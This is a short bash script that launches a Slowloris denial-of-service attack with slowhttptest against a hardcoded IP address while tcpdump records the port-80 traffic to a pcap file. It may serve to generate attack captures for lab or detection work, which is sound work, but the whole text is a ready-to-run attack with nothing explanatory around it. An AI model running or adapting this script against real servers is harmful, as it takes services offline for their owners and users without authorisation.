#!/bin/bash

TARGET_URL="http://205.174.165.68"
OUTPUT_PREFIX="slowloris"
INTERFACE="eth0"
TCPDUMP_FILE="pcap/${OUTPUT_PREFIX}_$(date +%Y%m%d_%H%M).pcap"

echo "[INFO] Starting tcpdump..."
sudo tcpdump -i "$INTERFACE" port 80 -w "$TCPDUMP_FILE" &
TCPDUMP_PID=$!

slowhttptest -c 1000 -H -g -o "$OUTPUT_PREFIX" -i 10 -r 200 -p 11 -u "$TARGET_URL"

echo "[INFO] Stopping tcpdump..."
kill "$TCPDUMP_PID"

echo "[INFO] Done."
